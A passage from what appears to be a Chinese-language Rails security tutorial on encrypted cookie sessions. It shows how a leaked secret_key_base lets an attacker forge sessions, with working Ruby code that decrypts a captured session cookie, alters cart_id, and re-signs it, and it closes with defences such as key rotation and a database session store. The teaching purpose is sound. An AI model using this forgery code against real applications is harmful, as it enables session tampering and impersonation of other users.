## [](#6-破解加密-cookie-based-session)6\. 破解加密 Cookie-based Session

## [](#6-1-什麽是加密-cookie)6-1 什麽是加密 Cookie

[Cookie](https://zh.wikipedia.org/zh-cn/Cookie) 是瀏覽器的一個功能，讓伺服器可以留數據在用戶瀏覽器上，這樣 Rails 就可以追蹤識別不同登入用戶。瀏覽器每次對伺服器的請求，都會附帶這個 Cookie 數據。

![image](https://ihower.tw/rails/part2/05-web-security/images/6-1.png)

例如用戶登入時，輸入帳號、密碼，伺服器檢查沒問題後，就會設定該瀏覽器的一個 Cookie 是 user\_id 是 123 接下來用戶瀏覽器對這個網站的任何請求，就會附帶這個 Cookie 參數，那麽伺服器就知道這個瀏覽器是用戶 123

不過，這是簡化的版本，相信大家都知道用戶是不可以相信的，存在用戶端的 Cookie 也是不可以相信的，駭客可以修改 user\_id 變成 1，那不就變身為管理員了嗎?

因此我們需要針對 Cookie 做加密，用一種叫做[對稱密鑰加密](https://zh.wikipedia.org/wiki/%E5%B0%8D%E7%A8%B1%E5%AF%86%E9%91%B0%E5%8A%A0%E5%AF%86)的算法，用一把密鑰來做加密，並且用這個密鑰可以解密回來。

例如，以下是一段用 [DES](https://zh.wikipedia.org/wiki/%E8%B3%87%E6%96%99%E5%8A%A0%E5%AF%86%E6%A8%99%E6%BA%96) 算法加密的 Ruby 代碼，將 `{message: "這是密文"}` 進行加密，你可以進 `irb` 實驗看看：

```
key = 'baRudSWouiTVfu0jwXfYDg==' # 一段隨機數是密鑰

# 加密
require 'json'
require 'base64'
require 'openssl'
text = {message: "這是密文"}.to_json
cipher = OpenSSL::Cipher::DES.new("ECB")
cipher.encrypt
cipher.key = Base64.strict_decode64(key)
encrypted = cipher.update(text) + cipher.final
data = Base64.strict_encode64(encrypted)
```

最後得到的 data 是 `"pxsTws7UtD7bOwCl6+FeLQEBJWqNTb3RSo2V84/udL0="` 就是一段加密後的文字。

以下是解密的代碼：

```
key = 'baRudSWouiTVfu0jwXfYDg==' # 要同一把密鑰才能解開

require 'json'
require 'base64'
require 'openssl'

encrypted_string = Base64.decode64(data)
cipher = OpenSSL::Cipher::DES.new("ECB")
cipher.decrypt
cipher.key = Base64.strict_decode64(key)
result = cipher.update(encrypted_string) + cipher.final
JSON.parse(result)
```

最後就解回 `{message: "這是密文"}` 了。

在不知道密鑰的情況下，要破解回本來的秘文是非常困難的，需要耗費非常強大的超級電腦 CPU 運算資源才能破解。

## [](#6-2-rails-的-secret-key)6-2 Rails 的 secret key

在 Rails 中，預設的 Session 實際上就是加密的 Cookie，我們在購物車教程中，使用了 `session[:cart_id]` 來儲存追蹤用戶是哪一臺購物車。

剛剛我們學到要能解密的關鍵是那個密鑰，而在 Rails 中，這一把密鑰就存在 `config/secrets.yml`

```
development:
  secret_key_base: a875bedfd1ba629c6c6039597cfd89a5bfb34fc440a0203d649bbd9e06de3e1939a4a586e1ed893108157688782b86b25223853a5b140aba7a21e5df675bed22

test:
  secret_key_base: 162ffbf8a8079326e46d6f6cf946de5c67a5c2372120a642b10c6d14b413f78fda09870a0697315ac067cf6bb6924b7ae16841894f3919ef09de65238d85f712

# Do not keep production secrets in the repository,
# instead read values from the environment.
production:
  secret_key_base: <%= ENV["SECRET_KEY_BASE"] %>
```

這個 YAML 還根據不同環境區分，本機開發用的密鑰，和部署 production 環境用的密鑰是不同的。

這把密鑰非常重要，不能外洩。知道密鑰的話，用戶就可以解開 Cookie，偷看裡面的內容，甚至修改存回去，這樣伺服器就會被騙過去….

讓我們看看如果外洩會怎麽樣，例如你把 production 正式環境的密鑰 push 到 github 公開的專案….

## [](#6-3-破解示範)6-3 破解示範

好，，假設我們已經知道密鑰是 `a875bedfd1ba629c6c6039597cfd89a5bfb34fc440a0203d649bbd9e06de3e1939a4a586e1ed893108157688782b86b25223853a5b140aba7a21e5df675bed22`

接著打開 Chrome 除錯器，複製下 `_hackme-app_session` 這段 Cookie 的值，例如：

```
V0JxRVF2UjQ4ZUx5M0tYMFgxN3ZIK092Yy9aY1RSNGJFZ3FIdDgvbUdOZjJxd0tJWHMyRk12bjRpRmMyRm85Qko1bXAwSThHZVA1TnhhZHhNb0hNL3FJQ0c3cVpGVUJ0VVY3N28zU3l6bkRCQkJXdGQ0LzRqR2tCeVVMSzNYbWtIRm1ycEhIejN2L1FmUTFIMktvNGpmWk8yOHFyQXUxZXlBMXd2SHlkV29RaENUdWwxSWsxdlBHVHF2Q0hTYXFoc0RydUd4MXJJMzQ5dm5ZUS9vYURnaWdubnduc1cwK3ExZldpMFVRSmZkUXZRa0FvR3FqQVplZEordE10MzVqTS0tSUs4NCtsZjNRZGRDMjM1ajVzQkRHQT09--f99ee52c228793955481cf56604ca293c96989a4
```

進 `rails console` 貼上：

```
def decrypt_session_cookie(cookie, key)
  cookie = CGI::unescape(cookie)
  salt         = "encrypted cookie"
  signed_salt  = "signed encrypted cookie"

  key_generator = ActiveSupport::KeyGenerator.new(key, iterations: 1000)
  secret = key_generator.generate_key(salt)
  sign_secret = key_generator.generate_key(signed_salt)

  encryptor = ActiveSupport::MessageEncryptor.new(secret, sign_secret, serializer: ActiveSupport::MessageEncryptor::NullSerializer)
  encryptor.decrypt_and_verify(cookie)
end

key = 'a875bedfd1ba629c6c6039597cfd89a5bfb34fc440a0203d649bbd9e06de3e1939a4a586e1ed893108157688782b86b25223853a5b140aba7a21e5df675bed22'
cookie = 'V0JxRVF2UjQ4ZUx5M0tYMFgxN3ZIK092Yy9aY1RSNGJFZ3FIdDgvbUdOZjJxd0tJWHMyRk12bjRpRmMyRm85Qko1bXAwSThHZVA1TnhhZHhNb0hNL3FJQ0c3cVpGVUJ0VVY3N28zU3l6bkRCQkJXdGQ0LzRqR2tCeVVMSzNYbWtIRm1ycEhIejN2L1FmUTFIMktvNGpmWk8yOHFyQXUxZXlBMXd2SHlkV29RaENUdWwxSWsxdlBHVHF2Q0hTYXFoc0RydUd4MXJJMzQ5dm5ZUS9vYURnaWdubnduc1cwK3ExZldpMFVRSmZkUXZRa0FvR3FqQVplZEordE10MzVqTS0tSUs4NCtsZjNRZGRDMjM1ajVzQkRHQT09--f99ee52c228793955481cf56604ca293c96989a4'

j = decrypt_session_cookie(cookie, key)

```

就會解密出一段 JSON 告訴我們用戶 id 是 48，購物車 `cart_id` 是 501。

```
"{\"session_id\":\"744813165ee90c30650c4ab8338d8140\",\"cart_id\":501,\"warden.user.user.key\":[[48],\"$2a$11$tpfEqlcCqD/8JRWPtvZTzu\"],\"_csrf_token\":\"zMPrCyTnxvpsPY0OWhPi8sM2suOa3dUFk4HHDyedbIs=\"}"
```

以下代碼會修改 cart\_id 並可以加密回去：

```
def encrypt_session_cookie(value, key)
  salt         = "encrypted cookie"
  signed_salt  = "signed encrypted cookie"

  key_generator = ActiveSupport::KeyGenerator.new(key, iterations: 1000)
  secret = key_generator.generate_key(salt)
  sign_secret = key_generator.generate_key(signed_salt)

  encryptor = ActiveSupport::MessageEncryptor.new(secret, sign_secret, serializer: ActionDispatch::Cookies::JsonSerializer)
  encryptor.encrypt_and_sign(value)
end

h = JSON.parse(j)
h["cart_id"] = 1
encrypt_session_cookie(h, key)
```

> 加解密的代碼是從 Rails 源代碼中挖出來的

最後得到 cookie 值，最後一步就是設定回 Chrome 瀏覽器。不過 Chrome 預設不允許我們改 Cookie，你可以裝一個 extension 是 [Cookie Inspector](https://chrome.google.com/webstore/detail/cookie-inspector/jgbbilmfbammlbbhmmgaagdkbkepnijn)，然後把剛剛改過的 cookie 值設進去，這樣就會騙過伺服器了。

## [](#6-4-如何防禦)6-4 如何防禦?

最基本的當然是不要外洩密鑰，如果外洩了，請馬上換一個密鑰。換密鑰會強迫所有用戶登出，因為大家的 Cookie 都會因為無法解密回來而失效。

如果你的網站需要非常高的安全性，則不建議使用 Cookie 加密來做 Session。在 Rails 可以更換 Session 存儲的方式，例如換成 [Active Record’s Session Store](https://github.com/rails/activerecord-session_store)。這會將 Session 數據存在資料庫中，而不是 Cookie 之中，這樣駭客就完全無從下手了。

打開 `config/initializers/session_store.rb` 觀察看看：

```
Rails.application.config.session_store :cookie_store, key: '_hackme-app_session'

```

這個設定檔就是在設定 Session 的 cookie key 叫做 `_hackme-app_session`，而且使用 `cookie_store` 機制來存儲。

* * *
